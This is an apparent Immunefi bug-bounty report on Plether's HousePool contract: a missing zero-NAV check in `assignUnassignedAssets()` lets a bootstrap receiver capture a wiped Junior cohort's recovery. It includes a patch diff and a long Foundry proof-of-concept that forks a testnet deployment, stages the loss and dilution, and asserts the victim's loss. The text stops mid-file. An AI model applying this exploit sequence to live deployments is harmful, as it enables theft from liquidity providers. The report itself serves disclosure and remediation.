# \#99331 [SC-Critical] Missing zero-NAV gate in `HousePool.assignUnassignedAssets()` lets the bootstrap receiver take a wiped Junior cohort's recovery

**Submitted on Nov 13th 2026 at 07:46:07 UTC by @EagleEye for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99331
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Vulnerability Details

`assignUnassignedAssets()` reconciles, then prices the whole `unassignedAssets` balance with the vault's bootstrap quote (HousePool.sol#L685), adds it to `juniorPrincipal` (HousePool.sol#L699) and mints the quoted shares to the owner-named receiver (HousePool.sol#L702). The quote is `amount * (supply + 1000) / (juniorPrincipal + 1)` (TrancheVault.sol#L1392, TrancheVault.sol#L1858). Nothing on this path looks at the tranche's NAV. The ordinary entry path refuses a Junior request while `juniorPrincipal == 0` with shares outstanding (HousePool.sol#L496) and defers activation in the same state (HousePool.sol#L917), because a wiped cohort's shares cannot be priced; the bootstrap path has only the Senior capacity check (HousePool.sol#L678), which does not apply to Junior. SECURITY.md:1175-1176 states that zero-NAV Junior shares "share in recovery".

After a loss wipes Junior (Junior-first waterfall) while Senior survives, the owner's documented recapitalization (CfdEngine.sol#L632) restores Senior gap-first and parks the remainder in `unassignedAssets` (HousePoolPendingPreviewLib.sol#L124-L135). Assigning that remainder to Junior, the documented next step, mints `amount * (supply + 1000)` shares against a denominator of 1. The receiver then holds the tranche, and the traders' give-back that follows (LP revenue goes to Junior once Senior is at its high-water mark) is credited to the receiver instead of the wiped holders. The Senior arm is not available in that state: with `juniorPrincipal == 0` the Senior capacity is zero (HousePoolSeniorCapacityLib.sol#L37), so Junior is the only assignment the owner can make.

1. Ordinary Junior LPs request deposits (ned 20,000,000 USDG, six LPs 10,000 each); the next permissionless LP settlement activates them.
2. The USD strengthens 1%; a mark refresh installs it, so the fork's open traders are in profit at the mark; one Junior LP requests an exit.
3. Loss event: the pool's USDG balance drops by all Junior equity at the mark plus 611,899.759657 of Senior (USDG is out of scope; modelled with `deal`).
4. The next settlement absorbs it Junior-first: Junior principal 0 with 120,718,460,466,388,521 shares outstanding, Senior 500,000 against a high-water mark of 1,111,899.759657.
5. The owner recapitalizes 711,899.759657 (gap plus 100,000); the next settlement restores Senior to its high-water mark and parks 100,000 in `unassignedAssets`; `canAcceptTrancheDeposits(false)` is false.
6. Within the fresh-mark window the owner calls `assignUnassignedAssets(false, receiver)`: 12,071,846,046,638,952,100,000,000,000 shares are minted to the receiver and Junior principal becomes 100,000.
7. The move reverses; the vaults' projected pricing books 360,133.244712 USDG of LP revenue to Junior.
8. The next permissionless settlement stores it: Junior principal 460,123.096017 after the hourly coupon.

## Impact Details

**Selected impact:** Theft of unclaimed yield

Before the assignment ned holds 19,929,516,763,227,480 of 120,718,460,466,388,521 Junior shares (16.51%); his share of the 360,133.244712 USDG recovery is 59,454.713966. After the assignment the receiver holds 12,071,846,046,638,952,100,000,000,000 of 12,071,846,046,759,670,560,466,388,521 shares. After the recovery ned's shares price at 0 and the receiver's at 460,133.244708 (the 100,000 assigned plus the recovery); the settlement that stores it leaves ned at 0 and the receiver at 460,123.096013. Delta: ned loses 59,454.713966; the whole pre-assignment cohort loses the 360,133.244712. In the control (assignment after the reversal, at NAV) ned's value is unchanged by the assignment and the receiver gets the NAV share of the 100,000.

## Recommendation

```diff
diff --git a/packages/perps/src/HousePool.sol b/packages/perps/src/HousePool.sol
index fceb093d..2a69c045 100644
--- a/packages/perps/src/HousePool.sol
+++ b/packages/perps/src/HousePool.sol
@@ -655,6 +655,7 @@ contract HousePool is IHousePool, IPerpsLPActions, Ownable2Step, Pausable, Reent
     ///      reconciles first, assigns the entire resulting `unassignedAssets` balance to the selected tranche,
     ///      and asks its configured vault to mint matching shares. No settlement token moves and this does not initialize the
     ///      tranche seed-lifecycle flag. Prevents later LPs from implicitly capturing previously ownerless value.
+    ///      Reverts while the junior tranche has outstanding shares at zero NAV, as ordinary junior entry is deferred.
     /// @param toSenior True to assign assets to senior, false to junior
     /// @param receiver Account receiving bootstrap tranche shares
     function assignUnassignedAssets(
@@ -674,6 +675,11 @@ contract HousePool is IHousePool, IPerpsLPActions, Ownable2Step, Pausable, Reent
         if (amount == 0) {
             revert HousePool__NoUnassignedAssets();
         }
+        // Same zero-NAV deferral as the ordinary entry gate: a wiped tranche with outstanding shares cannot be
+        // priced, and a bootstrap quote at zero NAV would hand the receiver the whole tranche and its recovery.
+        if (!toSenior && juniorPrincipal == 0 && _juniorShareSupply() != 0) {
+            revert HousePool__BootstrapAtZeroNav();
+        }
         if (toSenior) {
             _requireSeniorDepositCapacity(amount, _getWaterfallState());
         }
diff --git a/packages/perps/src/interfaces/IHousePool.sol b/packages/perps/src/interfaces/IHousePool.sol
index a9b934aa..6dfc2949 100644
--- a/packages/perps/src/interfaces/IHousePool.sol
+++ b/packages/perps/src/interfaces/IHousePool.sol
@@ -164,6 +164,9 @@ interface IHousePool {
     error HousePool__NoUnassignedAssets();
     /// @notice Bootstrap or seed pricing produced zero shares, or a seed amount was zero.
     error HousePool__BootstrapSharesZero();
+
+    /// @notice Thrown when a bootstrap assignment would price a tranche with outstanding shares at zero NAV.
+    error HousePool__BootstrapAtZeroNav();
     /// @notice The selected tranche's permanent seed position was already initialized.
     error HousePool__SeedAlreadyInitialized();
     /// @notice Trading activation was requested before both tranche seeds were initialized.
```

## Proof of Concept

## Proof of Concept

- Env var: `ARB_SEPOLIA_RPC_URL` = an archive RPC URL of Arbitrum Sepolia; read-only, the test runs on a local fork
- Fork block: 326368388 (chain id 421614), Plether Perps v2.0.0 (USDG) deployment, Pyth replaced by the repo's `MockPyth` (out of scope)
- Forge: 1.8.7
- Command, from `packages/perps`: `ARB_SEPOLIA_RPC_URL=<archive rpc url> forge test --match-path test/F054_JuniorBootstrapMintAtZeroNav.t.sol --match-test test_F054_poc -vvv`
- File: `test/F054_JuniorBootstrapMintAtZeroNav.t.sol` (control: `test_F054_control`, the assignment made after the reversal, at NAV; `test_SeniorArmRevertsAtZeroJunior`: the Senior arm reverts in the same state)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

// F-054 Zero-NAV Junior bootstrap mint in HousePool.assignUnassignedAssets() hands the receiver a wiped cohort's recovery
// Local fork of Arbitrum Sepolia (chain id 421614), Plether Perps v2.0.0 (USDG). Addresses: deployments/releases/2026-10-28-perps-arbitrum-sepolia-v2.0.0/addresses.env.
// Run: ARB_SEPOLIA_RPC_URL=<archive rpc url> forge test --match-path test/F054_JuniorBootstrapMintAtZeroNav.t.sol --match-test test_F054_poc -vvv
//   or against a local Anvil fork: anvil --fork-url <archive rpc url> --fork-block-number <FORK_BLOCK> &
//                                  ARB_SEPOLIA_RPC_URL=http://127.0.0.1:8545 forge test --match-path test/F054_JuniorBootstrapMintAtZeroNav.t.sol ...
// LOCAL FORK ONLY (Immunefi PoC rules): the RPC is read-only. Never vm.broadcast, cast send or --broadcast:
// a transaction on mainnet or a public testnet means an immediate, permanent Immunefi ban.

import {Test, console} from "forge-std/Test.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ICfdEngineProtocolLens} from "@plether/perps/interfaces/ICfdEngineProtocolLens.sol";
import {HousePoolEngineViewTypes} from "@plether/perps/interfaces/HousePoolEngineViewTypes.sol";
import {IPyth, PythStructs} from "@plether/shared/interfaces/IPyth.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @dev Public HousePool getters used by the PoC.
interface IHousePoolF054 {
    function seniorPrincipal() external view returns (uint256);
    function juniorPrincipal() external view returns (uint256);
    function seniorHighWaterMark() external view returns (uint256);
    function unassignedAssets() external view returns (uint256);
    function pendingRecapitalizationAssets() external view returns (uint256);
    function pendingTradingRevenueAssets() external view returns (uint256);
    function terminalDeficitAssets() external view returns (uint256);
    function owner() external view returns (address);
    function seniorVault() external view returns (address);
    function juniorVault() external view returns (address);
    function ENGINE_PROTOCOL_LENS() external view returns (address);
    function markStalenessLimit() external view returns (uint256);
    function lpEpochStart(uint256 epochId) external view returns (uint256);
    function canAcceptTrancheDeposits(bool isSenior) external view returns (bool);
    function assignUnassignedAssets(bool toSenior, address receiver) external;
    function getPendingTrancheState()
        external
        view
        returns (uint256 seniorPrincipalAssets, uint256 juniorPrincipalAssets, uint256 maxSeniorWithdraw, uint256 maxJuniorWithdraw);
}

interface IEngineF054 {
    function owner() external view returns (address);
    function degradedMode() external view returns (bool);
    function totalTraderClaimBalanceAssets() external view returns (uint256);
    function recapitalizePool(uint256 amountAssets) external;
}

interface IRouterF054 {
    function pletherOracle() external view returns (address);
    function updateMarkPrice(bytes[] calldata pythUpdateData) external payable;
    function settleLpEpoch(bytes[] calldata pythUpdateData) external payable;
}

interface ITrancheVaultF054 {
    function requestDeposit(uint256 assets, address receiver) external returns (uint256 requestId);
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function requestRedeem(uint256 shares, address controller, address owner) external returns (uint256 requestId);
    function convertToAssets(uint256 shares) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function accruedTotalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function depositQueueHead() external view returns (uint256);
    function redeemQueueHead() external view returns (uint256);
}

interface IOracleF054 {
    function pyth() external view returns (address);
    function isOracleFrozen() external view returns (bool);
    function pythFeedIds(uint256 index) external view returns (bytes32);
    function inversions(uint256 index) external view returns (bool);
    function housePool() external view returns (address);
}

interface IPythFeeF054 {
    function singleUpdateFeeInWei() external view returns (uint256);
}

interface IArbSysBlockF054 {
    function arbBlockNumber() external view returns (uint256);
}

contract F054_JuniorBootstrapMintAtZeroNav is Test {
    // Pinned Arbitrum Sepolia block (2026-11-05 17:42:16 UTC, a Thursday: FX market open), after deployment block 323658447.
    uint256 internal constant FORK_BLOCK = 326368388;

    // Deployed v2.0.0 addresses (addresses.env). Deployed from 1209ca8a; packages/perps/src is identical at scope a82d4fef.
    address internal constant ROUTER = 0x918663D6Da8CB33b325a04c4A5e8c51D42F3b444;
    address internal constant ORACLE = 0x4f2c62A0E03657F52C633c19c11f88d8F0897Bb2;
    address internal constant ENGINE = 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA;
    address internal constant POOL = 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e;
    address internal constant SENIOR_VAULT = 0x5Dc42Ba5a1E8DD3E1B6868D10f66A9bf8Fb5B83d;
    address internal constant JUNIOR_VAULT = 0x4A8b67184a1E3224c11A191cc69F22C50EEf734e;
    address internal constant USDG = 0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D;
    address internal constant OWNER = 0x5a71a4094Ec81165Ada48AA4c27dA48ec27E0d6B; // PERPS_OWNER (engine + pool owner)
    // Pyth contract the deployed oracle reads (out of scope; replaced below by the repo's own MockPyth).
    address internal constant PYTH = 0x0B73614636C855Bf23F342F307FB981A3e47f42B;

    // An ordinary Junior LP (the victim cohort member whose recovery is measured).
    uint256 internal constant NED_DEPOSIT = 20_000_000e6;
    // Ordinary Junior LPs whose exit requests are the matured LP work each permissionless settlement processes.
    uint256 internal constant EXITER_DEPOSIT = 10_000e6;
    // Senior principal left after the loss (the loss wipes Junior and impairs Senior down to this).
    uint256 internal constant SENIOR_KEPT = 500_000e6;
    // Owner recap above the Senior gap: the part that becomes ownerless `unassignedAssets`.
    uint256 internal constant EXTRA = 100_000e6;
    // Basket moves (bps of the real stored price at FORK_BLOCK): USD +1% (traders in profit), back to the stored price.
    uint256 internal constant USD_UP = 9_900;
    uint256 internal constant BASE = 10_000;

    IHousePoolF054 internal pool = IHousePoolF054(POOL);
    IEngineF054 internal engine = IEngineF054(ENGINE);
    IRouterF054 internal router = IRouterF054(ROUTER);
    ITrancheVaultF054 internal junior = ITrancheVaultF054(JUNIOR_VAULT);
    ITrancheVaultF054 internal senior = ITrancheVaultF054(SENIOR_VAULT);
    MockPyth internal pyth = MockPyth(PYTH);

    address internal ned = makeAddr("ned"); // ordinary Junior LP, keeps his shares through the loss (victim)
    address internal receiver = makeAddr("bootstrapReceiver"); // the address the owner names in assignUnassignedAssets
    address internal keeper = makeAddr("keeper"); // any LP-epoch settler (permissionless Router path)
    address internal refresher = makeAddr("refresher"); // any mark refresher (e.g. the oracle worker)
    // Junior LPs whose exit requests are the LP work of the loss pass, the recap pass and the recovery pass.
    address[] internal exiters;
    uint256 internal nextExiter;

    bytes32[] internal feedIds;
    bool[] internal inverted;
    PythStructs.Price[] internal storedAtFork;
    uint256 internal pythFee;
    uint256 internal l2Height = FORK_BLOCK;

    struct Run {
        uint256 nedShares;
        uint256 supplyBefore;
        uint256 lpEquityAtLoss;
        uint256 lossAssets;
        uint256 seniorAfterLoss;
        uint256 juniorAfterLoss;
        uint256 hwmAfterLoss;
        uint256 gap;
        uint256 recap;
        uint256 seniorAfterRecap;
        uint256 juniorAfterRecap;
        uint256 unassignedAfterRecap;
        bool assigned;
        uint256 receiverShares;
        uint256 supplyAfterAssign;
        uint256 juniorAfterAssign;
        uint256 nedValueAfterAssign;
        uint256 receiverValueAfterAssign;
        uint256 juniorAfterRecovery;
        uint256 revenue;
        uint256 nedEntitlement;
        uint256 nedValueAfterRecovery;
        uint256 receiverValueAfterRecovery;
    }

    // virtual: the never-submitted fix-check test (F054_FixCheck.t.sol, made by poc_patch.py) extends this setUp.
    function setUp() public virtual {
        vm.createSelectFork(vm.envString("ARB_SEPOLIA_RPC_URL"), FORK_BLOCK);
        assertEq(block.chainid, 421614, "not Arbitrum Sepolia");

        // Drift guard: the live deployment state this PoC relies on.
        assertEq(router.pletherOracle(), ORACLE, "router oracle drifted");
        assertEq(IOracleF054(ORACLE).housePool(), POOL, "oracle pool drifted");
        assertEq(IOracleF054(ORACLE).pyth(), PYTH, "oracle Pyth drifted");
        assertEq(pool.seniorVault(), SENIOR_VAULT, "senior vault drifted");
        assertEq(pool.juniorVault(), JUNIOR_VAULT, "junior vault drifted");
        assertEq(pool.owner(), OWNER, "pool owner drifted");
        assertEq(engine.owner(), OWNER, "engine owner drifted");
        assertFalse(IOracleF054(ORACLE).isOracleFrozen(), "fork block must be a live (unfrozen) market");
        assertFalse(engine.degradedMode(), "engine not degraded at the fork");
        assertGt(pool.seniorPrincipal(), SENIOR_KEPT, "live Senior principal above the kept amount");
        assertGt(pool.juniorPrincipal(), 0, "live Junior principal");
        assertEq(pool.seniorHighWaterMark(), pool.seniorPrincipal(), "Senior not impaired at the fork");
        assertEq(pool.unassignedAssets(), 0, "no unassigned assets at the fork");
        assertEq(pool.pendingRecapitalizationAssets(), 0, "no queued recap at the fork");
        assertEq(pool.pendingTradingRevenueAssets(), 0, "no queued revenue at the fork");
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "no recorded trader claims at the fork");
        assertEq(senior.depositQueueHead() + senior.redeemQueueHead(), 0, "senior LP queues empty");
        assertEq(junior.depositQueueHead() + junior.redeemQueueHead(), 0, "junior LP queues empty");
        assertGt(junior.totalSupply(), 0, "Junior shares exist");
        assertTrue(pool.canAcceptTrancheDeposits(false), "Junior entry open at the fork");
        assertEq(pool.markStalenessLimit(), 60, "pool mark staleness drifted");
        for (uint256 i; i < 6; ++i) {
            feedIds.push(IOracleF054(ORACLE).pythFeedIds(i));
            inverted.push(IOracleF054(ORACLE).inversions(i));
        }
        // Every in-scope contract runs as DEPLOYED at FORK_BLOCK; the PoC never replaces or edits in-scope code.

        // Pyth is out of scope: replace its code with the repo's MockPyth. Storage starts from the REAL stored prices
        // at FORK_BLOCK. The real deployment quotes a zero update fee; keep it.
        pythFee = IPythFeeF054(PYTH).singleUpdateFeeInWei();
        for (uint256 i; i < 6; ++i) {
            storedAtFork.push(IPyth(PYTH).getPriceUnsafe(feedIds[i]));
        }
        vm.etch(PYTH, type(MockPyth).runtimeCode);
        for (uint256 slot; slot < 12; ++slot) {
            vm.store(PYTH, bytes32(slot), bytes32(0)); // MockPyth scalar slots only
        }
        pyth.setFee(pythFee);
        for (uint256 i; i < 6; ++i) {
            PythStructs.Price memory p = storedAtFork[i];
            pyth.setPrice(feedIds[i], p.price, p.conf, p.expo, p.publishTime);
        }
        vm.deal(keeper, 1 ether);
        vm.deal(refresher, 1 ether);

        exiters.push(makeAddr("jill"));
        exiters.push(makeAddr("joe"));
        exiters.push(makeAddr("kim"));
        exiters.push(makeAddr("lee"));
        exiters.push(makeAddr("max"));
        exiters.push(makeAddr("mia"));
    }

    /// The claim, against live state at FORK_BLOCK. Must FAIL once the mitigation is applied.
    /// Junior is wiped, the owner restores Senior and parks the extra; the owner then assigns the extra to Junior
    /// (documented bootstrap) while Junior NAV is zero and Junior shares are outstanding.
    function test_F054_poc() public {
        Run memory r = _wipeAndRecap();

        // ---- before: the wiped Junior cohort and its documented share in the recovery.
        console.log("ned Junior shares / Junior supply before the assign", r.nedShares, r.supplyBefore);
        console.log("Junior principal / unassigned before the assign", r.juniorAfterRecap, r.unassignedAfterRecap);

        // Step 6: within the fresh-mark window the owner calls assignUnassignedAssets(false, receiver): the quote is
        //         amount * (supply + 1000) / (0 + 1) shares (HousePool.sol:685, TrancheVault.sol:1858), nothing
        //         defers it (the ordinary entry path refuses this state: HousePool.sol:496-498, :917-919).
        r = _assignToJunior(r);
        console.log("receiver shares minted / Junior supply after", r.receiverShares, r.supplyAfterAssign);
        console.log("Junior principal after the assign", r.juniorAfterAssign);
        console.log("ned / receiver value right after the assign", r.nedValueAfterAssign, r.receiverValueAfterAssign);

        // Step 7: the traders' marked profit reverses (mark back to the stored price); the vaults' own pricing
        //         (HousePool.getPendingTrancheState) books it as LP revenue to Junior (Senior is at its high-water
        //         mark). Step 8 stores it through a permissionless settlement.
        r = _recover(r, false);
        console.log("LP revenue projected after the reversal", r.revenue);
        console.log("Junior principal after the recovery", r.juniorAfterRecovery);
        console.log("ned's recovery share by his pre-assign ownership", r.nedEntitlement);
        console.log("ned / receiver value after the recovery", r.nedValueAfterRecovery, r.receiverValueAfterRecovery);

        // ---- damage: ned's share of the recovery went to the receiver.
        int256 nedLost = int256(r.nedEntitlement) - int256(r.nedValueAfterRecovery);
        assertGt(nedLost, int256(r.nedEntitlement / 2), "wiped Junior holder lost his recovery share to the bootstrap receiver"); // DAMAGE
        console.log("ned recovery lost (entitlement - value)", uint256(nedLost));

        assertTrue(r.assigned, "owner assignment went through");

        // Step 8: the next permissionless settlement (processes one more Junior exit) stores the recovery.
        uint256 workEpoch = _requestNextExit();
        uint64 t = uint64(pool.lpEpochStart(workEpoch)) + 30;
        _advance(t);
        _settle(t, BASE);
        assertApproxEqAbs(pool.juniorPrincipal(), r.juniorAfterRecovery, 20e6, "stored Junior principal after the recovery pass");
        assertEq(junior.convertToAssets(r.nedShares), 0, "ned's shares still price at 0 after the pass");
        console.log("stored Junior principal after the recovery pass", pool.juniorPrincipal());
        console.log("ned / receiver value after the recovery pass", junior.convertToAssets(r.nedShares), junior.convertToAssets(r.receiverShares));

        assertGe(r.receiverShares * 1e9 / r.supplyAfterAssign, 999_999_999, "receiver holds > 99.9999999% of Junior");
        assertGt(r.revenue, 0, "revenue booked");
        assertGe(r.receiverValueAfterRecovery, r.juniorAfterAssign + r.revenue - r.revenue / 1_000_000, "receiver took the recovery");
        assertEq(pool.unassignedAssets(), 0, "unassigned consumed");
    }

    /// Control: the honest ordering on the same fork. The owner assigns the extra only once Junior NAV is nonzero
    /// again (the traders' profit has reversed at the mark); the quote is then at NAV and the wiped cohort keeps its
    /// recovery share. Must PASS with and without the fix.
    function test_F054_control() public {
        Run memory r = _wipeAndRecap();
        r = _recover(r, false);
        // ned's recovery share is what his pre-loss ownership says (the vaults' own projected pricing).
        assertApproxEqAbs(r.nedValueAfterRecovery, r.nedEntitlement, 1e6, "control: wiped holder received his recovery share");
        assertEq(pool.unassignedAssets(), r.unassignedAfterRecap, "control: extra still parked");
        uint256 juniorBefore = r.juniorAfterRecovery;
        uint256 supplyBefore = junior.accruedTotalSupply();
        r = _assignToJunior(r);
        assertTrue(r.assigned, "control: owner assignment at nonzero NAV");
        assertApproxEqAbs(pool.juniorPrincipal(), juniorBefore + r.unassignedAfterRecap, 1e6, "control: extra joined Junior");
        // Receiver gets the NAV share of the extra, within rounding; ned keeps his value.
        uint256 expectedShares = r.unassignedAfterRecap * supplyBefore / juniorBefore;
        assertApproxEqRel(r.receiverShares, expectedShares, 1e14, "control: receiver shares priced at NAV");
        assertApproxEqAbs(junior.convertToAssets(r.nedShares), r.nedValueAfterRecovery, 1e6, "control: ned keeps his value");
        console.log("control: ned value after recovery / after assign", r.nedValueAfterRecovery, junior.convertToAssets(r.nedShares));
        console.log("control: receiver shares / expected at NAV", r.receiverShares, expectedShares);
    }

    /// Extra: the Senior arm is closed in the same state (J == 0 gives zero Senior capacity); only the Junior arm
    /// mints. Not part of the claim; evidence that the owner has no other way to assign the extra while Junior is wiped.
    function test_SeniorArmRevertsAtZeroJunior() public {
        Run memory r = _wipeAndRecap();
        assertEq(r.juniorAfterRecap, 0, "Junior wiped");
        uint64 t = uint64(vm.getBlockTimestamp()) + 1;
        _advance(t);
        _refreshMark(t, USD_UP);
        vm.prank(OWNER);
        vm.expectRevert(bytes4(keccak256("HousePool__ExceedsSeniorDepositCapacity()")));
        pool.assignUnassignedAssets(true, receiver);
    }

    // ------------------------------------------------------------------ shared steps

    function _wipeAndRecap() internal returns (Run memory r) {
        // Step 1: an ordinary Junior LP (ned) requests a 20M USDG deposit, six more 10k each; the next LP epoch
        //         settles them (permissionless keeper) and they claim their shares.
        uint256 requestEpoch = _requestDeposit(junior, ned, NED_DEPOSIT);
        for (uint256 i; i < exiters.length; ++i) {
            _requestDeposit(junior, exiters[i], EXITER_DEPOSIT);
        }
        uint64 t = uint64(pool.lpEpochStart(requestEpoch)) + 30;
        _advance(t);
        _settle(t, BASE);
        vm.prank(ned);
        r.nedShares = junior.deposit(NED_DEPOSIT, ned);
        for (uint256 i; i < exiters.length; ++i) {
            vm.prank(exiters[i]);
            junior.deposit(EXITER_DEPOSIT, exiters[i]);
        }
        assertEq(pool.seniorHighWaterMark(), pool.seniorPrincipal(), "Senior not impaired before the loss");

        // Step 2: one epoch later the USD strengthens 1% against the basket; a mark refresh installs it, so the
        //         fork's open traders are in profit at the mark. The first Junior LP asks to exit.
        t = uint64(pool.lpEpochStart(requestEpoch + 1)) + 40;
        _advance(t);
        _refreshMark(t, USD_UP);
        uint256 workEpoch = _requestNextExit();

        // Step 3: loss event at the next epoch, modelled as USDG leaving the pool (USDG is out of scope and mockable;
        //         HousePool.totalAssets() counts the raw shortfall): all Junior equity at the mark plus the Senior
        //         impairment, leaving SENIOR_KEPT of Senior.
        t = uint64(pool.lpEpochStart(workEpoch)) + 30;
        _advance(t);
        _refreshMark(t, USD_UP);
        HousePoolEngineViewTypes.HousePoolInputSnapshot memory s = ICfdEngineProtocolLens(pool.ENGINE_PROTOCOL_LENS())
            .getHousePoolInputSnapshot(pool.markStalenessLimit());
        assertLt(s.terminalLpPriceDeltaAssets, 0, "traders in profit at the loss");
        r.lpEquityAtLoss =
            uint256(int256(s.physicalAssets) + s.terminalLpPriceDeltaAssets - int256(s.traderClaimBalanceAssets));
        assertGt(r.lpEquityAtLoss, SENIOR_KEPT, "LP equity above the kept Senior");
        r.lossAssets = r.lpEquityAtLoss - SENIOR_KEPT;
        assertGe(IERC20(USDG).balanceOf(POOL), r.lossAssets, "pool holds the cash that leaves");
        deal(USDG, POOL, IERC20(USDG).balanceOf(POOL) - r.lossAssets);

        // Step 4: the next LP settlement (permissionless, processes the first exit) absorbs the loss Junior-first:
        //         Junior principal is 0 while its shares stay outstanding; Senior is impaired below its HWM.
        t += 1;
        _advance(t);
        _settle(t, USD_UP);
        r.seniorAfterLoss = pool.seniorPrincipal();
        r.juniorAfterLoss = pool.juniorPrincipal();
        r.hwmAfterLoss = pool.seniorHighWaterMark();
        assertEq(r.juniorAfterLoss, 0, "loss wiped Junior principal");
        assertGt(r.seniorAfterLoss, 0, "Senior survives the loss");
        assertLt(r.seniorAfterLoss, r.hwmAfterLoss, "Senior impaired");
        assertEq(pool.terminalDeficitAssets(), 0, "no terminal deficit");
        assertGt(junior.accruedTotalSupply(), 0, "Junior shares outstanding after the wipe");
        console.log("after loss: Senior / Junior / HWM", r.seniorAfterLoss, r.juniorAfterLoss, r.hwmAfterLoss);

        // Step 5: the owner recapitalizes (documented CfdEngine.recapitalizePool) with the Senior gap plus EXTRA.
        //         The next settlement routes it gap-first (HousePoolPendingPreviewLib.sol:124-138): Senior is back at
        //         its HWM and EXTRA is ownerless `unassignedAssets`. Junior NAV stays 0 with shares outstanding, so the
        //         ordinary Junior entry gate is closed.
        r.gap = r.hwmAfterLoss - r.seniorAfterLoss;
        r.recap = r.gap + EXTRA;
        deal(USDG, OWNER, r.recap);
        vm.startPrank(OWNER);
        IERC20(USDG).approve(ENGINE, r.recap);
        engine.recapitalizePool(r.recap);
        vm.stopPrank();
        workEpoch = _requestNextExit();
        t = uint64(pool.lpEpochStart(workEpoch)) + 30;
        _advance(t);
        _settle(t, USD_UP);
        r.seniorAfterRecap = pool.seniorPrincipal();
        r.juniorAfterRecap = pool.juniorPrincipal();
        r.unassignedAfterRecap = pool.unassignedAssets();
        r.supplyBefore = junior.accruedTotalSupply();
        assertEq(pool.pendingRecapitalizationAssets(), 0, "recap fully routed");
        assertEq(r.seniorAfterRecap, pool.seniorHighWaterMark(), "Senior restored to its HWM");
        assertEq(r.juniorAfterRecap, 0, "Junior principal still 0");
        assertEq(r.unassignedAfterRecap, EXTRA, "extra parked as unassigned");
        assertFalse(pool.canAcceptTrancheDeposits(false), "ordinary Junior entry closed (zero NAV, unassigned)");
        console.log("owner recap (gap + extra) / gap", r.recap, r.gap);
        console.log("after recap pass: Senior / HWM / unassigned", r.seniorAfterRecap, pool.seniorHighWaterMark(), r.unassignedAfterRecap);
    }

    /// @dev Owner bootstrap of the parked extra into Junior, inside the fresh-mark window. try/catch so the fix check
    ///      (the mitigation makes this call revert) reaches the damage assert instead of reverting here.
    function _assignToJunior(Run memory r) internal returns (Run memory) {
        uint64 t = uint64(vm.getBlockTimestamp()) + 1;
        _advance(t);
        _refreshMark(t, _lastBasket);
        uint256 receiverBefore = junior.balanceOf(receiver);
        vm.prank(OWNER);
        try pool.assignUnassignedAssets(false, receiver) {
            r.assigned = true;
        } catch {
            r.assigned = false;
        }
        r.receiverShares = junior.balanceOf(receiver) - receiverBefore;
        r.supplyAfterAssign = junior.accruedTotalSupply();
        r.juniorAfterAssign = pool.juniorPrincipal();
        r.nedValueAfterAssign = junior.convertToAssets(r.nedShares);
        r.receiverValueAfterAssign = junior.convertToAssets(r.receiverShares);
        return r;
    }

    /// @dev The 1% move reverses. `settle`: the next permissionless settlement books the traders' give-back as LP
    ///      revenue (stored state). Otherwise a mark refresh installs the reversal and the values are the vaults'
    ///      own projected pricing (HousePool.getPendingTrancheState), which the owner's next action books live.
    function _recover(Run memory r, bool settle) internal returns (Run memory) {
        uint256 juniorBefore = pool.juniorPrincipal();
        uint256 supplyAtRecovery = junior.accruedTotalSupply();
        if (settle) {
            uint256 workEpoch = _requestNextExit();
            uint64 t = uint64(pool.lpEpochStart(workEpoch)) + 30;
            _advance(t);
            _settle(t, BASE);
            r.juniorAfterRecovery = pool.juniorPrincipal();
        } else {
            uint64 t = uint64(vm.getBlockTimestamp()) + 1;
            _advance(t);
            _refreshMark(t, BASE);
            (, r.juniorAfterRecovery,,) = pool.getPendingTrancheState();
        }
        r.revenue = r.juniorAfterRecovery - juniorBefore;
        // What ned's pre-assign ownership of the wiped cohort entitles him to out of this revenue.
        r.nedEntitlement = r.revenue * r.nedShares / r.supplyBefore;
        r.nedValueAfterRecovery = junior.convertToAssets(r.nedShares);
        r.receiverValueAfterRecovery = junior.convertToAssets(r.receiverShares);
        (uint256 seniorProjected,,,) = pool.getPendingTrancheState();
        assertApproxEqAbs(seniorProjected, pool.seniorHighWaterMark(), 1e6, "Senior at its HWM after the recovery (hourly coupon aside)");
        console.log("recovery: Junior supply at recovery", supplyAtRecovery);
        return r;
    }

    function _requestDeposit(ITrancheVaultF054 vault, address lp, uint256 assets) internal returns (uint256 epoch) {
        deal(USDG, lp, assets);
        vm.startPrank(lp);
        IERC20(USDG).approve(address(vault), assets);
        epoch = vault.requestDeposit(assets, lp);
        vm.stopPrank();
    }

    function _requestNextExit() internal returns (uint256 epoch) {
        address lp = exiters[nextExiter++];
        uint256 shares = junior.balanceOf(lp);
        vm.prank(lp);
        epoch = junior.requestRedeem(shares, lp, lp);
    }

    // ------------------------------------------------------------------ helpers

    uint256 internal _lastBasket = BASE;

    function _refreshMark(uint64 tick, uint256 basketBps) internal {
        _lastBasket = basketBps;
        vm.prank(refresher);
        router.updateMarkPrice{value: pythFee}(_payload(tick, basketBps));
    }

    function _settle(uint64 tick, uint256 basketBps) internal {
        _lastBasket = basketBps;
        vm.prank(keeper);
        router.settleLpEpoch{value: pythFee}(_payload(tick, basketBps));
    }

    /// @dev Moves time and the L2 block. On an Arbitrum fork `block.number` is the L1 block, and forge serves the
    ///      ArbSys precompile (0x64, out of scope) as the fork's L2 block without following vm.roll. On chain
    ///      arbBlockNumber() advances every L2 block, so the PoC sets it to the rolled L2 height.
    function _advance(uint64 timestamp) internal {
        l2Height += 4 * (timestamp - vm.getBlockTimestamp()) + 1; // Arbitrum produces ~4 L2 blocks per second
        vm.warp(timestamp);
        vm.roll(l2Height);
        vm.mockCall(
            address(100), abi.encodeWithSelector(IArbSysBlockF054.arbBlockNumber.selector), abi.encode(l2Height)
        );
    }

